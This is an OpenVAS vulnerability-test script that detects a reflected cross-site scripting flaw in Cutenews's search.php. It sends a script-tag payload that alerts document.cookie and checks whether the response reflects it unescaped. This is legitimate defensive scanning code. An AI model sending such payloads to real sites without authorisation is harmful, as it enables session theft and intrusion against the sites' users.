# OpenVAS Vulnerability Test
# $Id: cutenews_145_xss.nasl 3854 2016-08-18 13:15:25Z teissa $
# Description: Web application abuses
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is affected by a
cross-site scripting issue. 

Description:

The version of Cutenews installed on the remote host fails to sanitize
input to the 'search.php' script before using it to generate dynamic
HTML to be returned to the user.  An unauthenticated attacker can
exploit this issue to execute a cross-site scripting attack. 

This version of Cutenews is also likely affected by other associated
issues.";

tag_solution = "Unknown at this time.";

if(description)
{
 # set script identifiers

 script_id(80052);;
 script_version("$Revision: 3854 $");
 script_tag(name:"last_modification", value:"$Date: 2016-08-18 15:15:25 +0200 (Thu, 18 Aug 2016) $");
 script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

 script_bugtraq_id(21233);

 name = "Cutenews search.php Cross-Site Scripting Vulnerability";
 family = "Web application abuses";

 script_name(name);

 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_copyright("This script is Copyright (C) 2006 Justin Seitz");

 script_family(family);

 script_dependencies("cutenews_detect.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.kapda.ir/advisory-450.html");
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);

#
#
#	Test for an install of Cutenews
#
#

install = get_kb_item(string("www/", port, "/cutenews"));
if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
	  dir = matches[2];
	  attackstring = '"><script>alert(document.cookie)</script>';
          attacksploit = urlencode(str:attackstring, unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!~*'()-]/");
	  attackreq = http_get(item:string(dir, "/search.php/", attacksploit), port:port);			
	  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
	  if(isnull(attackres)) exit(0);

	  if(string('action="', dir, "/search.php/", attackstring, "?subaction=search") >< attackres)
	  {
		security_message(port);
		set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	  }
}
